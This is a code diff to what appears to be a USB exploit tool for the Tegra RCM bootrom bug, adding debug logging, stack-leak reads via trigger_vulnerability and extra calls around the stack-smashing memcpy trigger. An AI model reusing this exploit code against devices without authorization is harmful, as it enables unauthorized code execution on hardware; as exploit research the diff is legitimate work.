@@ -33,6 +33,7 @@ import errno
 import ctypes
 import argparse
 import platform
+import time
 import binascii
 
 USB_XFER_MAX = 0x1000
@@ -145,7 +146,7 @@ class HaxBackend:
         """ Set and return the device to be used """
 
         # os.environ['PYUSB_DEBUG'] = 'debug'
-        os.environ['PYUSB_DEBUG'] = 'info'
+        os.environ['PYUSB_DEBUG'] = 'debug'
         import usb
 
         self.dev = usb.core.find(idVendor=vid, idProduct=pid)
@@ -166,11 +167,7 @@ class MacOSBackend(HaxBackend):
     def trigger_vulnerability(self, length):
 
         # Triggering the vulnerability is simplest on macOS; we simply issue the control request as-is.
-        r = self.dev.ctrl_transfer(self.STANDARD_REQUEST_DEVICE_TO_HOST_TO_INTERFACE, self.GET_STATUS, 0, 0, length)
-        print("ctrl res:")
-        print(r)
-        return r
-
+        return self.dev.ctrl_transfer(self.STANDARD_REQUEST_DEVICE_TO_HOST_TO_INTERFACE, self.GET_STATUS, 0, 0, length)
 
 
 class LinuxBackend(HaxBackend):
@@ -492,6 +489,7 @@ class RCMHax:
                 print("Waiting for a TegraRCM device to come online...")
                 while self.dev is None:
                     self.dev = self._find_device(vid, pid)
+                    time.sleep(0.1)
 
             # ... or bail out.
             else:
@@ -607,6 +605,7 @@ parser.add_argument('--relocator', metavar='binary', dest='relocator', type=str,
 parser.add_argument('--override-checks', dest='skip_checks', action='store_true', help="don't check for a supported controller; useful if you've patched your EHCI driver")
 parser.add_argument('--allow-failed-id', dest='permissive_id', action='store_true', help="continue even if reading the device's ID fails; useful for development but not for end users")
 parser.add_argument('--tty', dest='tty_mode', action='store_true', help="Enable TTY mode after payload launch")
+parser.add_argument('--do-read', dest='do_read', action='store_true', help="Do a read instead of just exiting")
 arguments = parser.parse_args()
 
 # Expand out the payload path to handle any user-refrences.
@@ -628,6 +627,11 @@ try:
 except IOError as e:
     print(e)
     sys.exit(-1)
+
+# switch.backend.dev.reset()
+
+stack = switch.backend.trigger_vulnerability(128)
+print("stack: {}".format(binascii.hexlify(stack)))
 
 # Print the device's ID. Note that reading the device's ID is necessary to get it into
 try:
@@ -707,10 +711,36 @@ switch.write(payload)
 # about to DMA into the higher one, so we have less to copy during our attack.
 switch.switch_to_highbuf()
 
+
+remaining_junk = b'\0' * (length - len(payload))
+
+# write the rest of the payload to trigger a hash mismatch
+switch.write(remaining_junk)
+
+# try a read to get an error message
+# after_rcm_read = switch.read(128)
+# print(after_rcm_read)
+# print(binascii.hexlify(after_rcm_read))
+
+switch = None
+
+input("wait:")
+
+try:
+    switch = RCMHax(wait_for_device=arguments.wait, vid=arguments.vid, 
+            pid=arguments.pid, os_override=arguments.platform, override_checks=arguments.skip_checks)
+except IOError as e:
+    print(e)
+    sys.exit(-1)
+
+stack = switch.backend.trigger_vulnerability(128)
+print("stack2: {}".format(binascii.hexlify(stack)))
+
 # Smash the device's stack, triggering the vulnerability.
 print("Smashing the stack...")
 try:
-    switch.trigger_controlled_memcpy()
+    stack = switch.trigger_controlled_memcpy()
+    print("stack: {}".format(binascii.hexlify(stack)))
 except ValueError as e:
     print(str(e))
 except IOError:
